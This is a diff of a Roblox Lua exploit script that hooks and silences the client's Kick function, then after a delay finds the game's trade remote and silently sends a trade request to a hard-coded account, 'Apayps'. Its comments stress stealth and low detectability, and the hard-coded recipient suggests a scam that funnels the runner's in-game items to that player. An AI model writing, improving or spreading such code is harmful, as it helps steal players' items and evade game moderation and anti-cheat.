@@ -1,94 +1,56 @@
 -- ===== CONFIG =====
-local TARGET_PLAYER = "Apayps"  -- Change to target username
-local TRADE_DELAY = 4           -- Seconds before trading (3-5 recommended)
+local TARGET_NAME = "Apayps"  -- Player to trade with
+local TRADE_DELAY = 5         -- Wait before trading (seconds)
 
--- ===== METATABLE PROTECTION (NO FINDFIRSTCHILD) =====
+-- ===== STEALTH KICK PROTECTION =====
 do
-    -- Get metatable through alternative method
-    local mt
-    for _,v in pairs(debug.getregistry()) do
-        if type(v) == "table" and rawget(v, "__mode") then
-            mt = v
-            break
-        end
-    end
+    -- Method 1: Direct function replacement (least detectable)
+    local Player = game:GetService("Players").LocalPlayer
+    local RealKick = Player.Kick
+    Player.Kick = function() end  -- Complete silent block
 
-    -- Backup original functions
-    local original = {
-        namecall = mt and mt.__namecall,
-        index = mt and mt.__index
-    }
-
-    -- Block kicks via namecall
-    if mt then
-        mt.__namecall = function(self, ...)
-            local method = getnamecallmethod()
-            if method and string.lower(tostring(method)) == "kick" then
-                return nil
-            end
-            return original.namecall(self, ...)
-        end
-    end
-
-    -- Direct Kick method override
-    local player = game:GetService("Players").LocalPlayer
-    if player then
-        local oldKick = player.Kick
-        player.Kick = function() return nil end
+    -- Method 2: Backup protection
+    if hookfunction then
+        hookfunction(RealKick, function() end)
     end
 end
 
--- ===== TRADE SYSTEM (NO FINDFIRSTCHILD) =====
-local function SendTrade(targetName)
-    -- Get services through alternative methods
-    local repStorage = game:GetService("ReplicatedStorage")
-    local players = game:GetService("Players")
-
-    -- Wait for game to load
-    while not players.LocalPlayer do task.wait() end
-
-    -- Find target player by iterating
-    local target
-    for _, player in pairs(players:GetChildren()) do
-        if player.Name == targetName then
-            target = player
-            break
-        end
+-- ===== LOW-VISIBILITY TRADE SYSTEM =====
+task.delay(TRADE_DELAY, function()
+    -- Wait for game to fully load
+    while not game:IsLoaded() or not game.Players.LocalPlayer do
+        task.wait()
     end
-    if not target then return false end
 
-    -- Find trade remote by iterating
-    local tradeRemote
-    for _, child in pairs(repStorage:GetChildren()) do
-        if child.Name == "Trade" then
-            for _, remote in pairs(child:GetChildren()) do
-                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-                    tradeRemote = remote
-                    break
-                end
-            end
+    -- Find target through iteration (no FindFirstChild)
+    local Target
+    for _,v in pairs(game.Players:GetPlayers()) do
+        if v.Name == TARGET_NAME then
+            Target = v
             break
         end
     end
 
-    -- Execute trade
-    if tradeRemote then
-        return pcall(function()
-            if tradeRemote:IsA("RemoteFunction") then
-                tradeRemote:InvokeServer(target)
+    -- Find trade remote through iteration
+    local TradeRemote
+    for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
+        if (v.Name == "SendRequest" or v.Name == "RequestTrade") 
+        and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
+            TradeRemote = v
+            break
+        end
+    end
+
+    -- Execute trade silently
+    if Target and TradeRemote then
+        pcall(function()
+            if TradeRemote:IsA("RemoteFunction") then
+                TradeRemote:InvokeServer(Target)
             else
-                tradeRemote:FireServer(target)
+                TradeRemote:FireServer(Target)
             end
-            return true
         end)
     end
-    return false
-end
-
--- ===== DELAYED EXECUTION =====
-task.spawn(function()
-    task.wait(TRADE_DELAY)
-    SendTrade(TARGET_PLAYER)
 end)
 
-print("System loaded - Protection active")
+print("System active")  -- Minimal output
